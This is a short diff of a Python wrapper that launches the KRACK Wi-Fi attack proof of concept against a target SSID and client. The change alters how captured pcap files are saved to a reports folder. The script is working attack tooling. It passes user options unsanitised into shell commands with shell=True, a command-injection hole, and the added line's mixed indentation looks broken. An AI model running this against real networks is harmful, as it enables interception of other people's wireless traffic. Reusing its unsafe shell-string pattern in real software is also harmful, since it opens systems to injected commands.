@@ -143,15 +143,13 @@ def main():
 		                         options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
 			
 		elif options.pcap:
-			# TODO creates a file, but fails to move it. Also haven't verified that it contains anything of interest. 
+			# TODO Verify that this file is moved and contains useful information 
 			# Saves pcap from attack to file. 
 			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
 			source=os.listdir("krackattacks-poc-zerokey/krackattack/")
 			destination="reports/"
-			for fileName in source:
-				if str(".pcap") in str(fileName):
-					shutil.move(fileName, destination)
+                        subprocess.call(["mv " + "krackattacks-poc-zerokey/krackattack/" + "*pcap " + destination], shell=True)
 
 		else: 
 			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
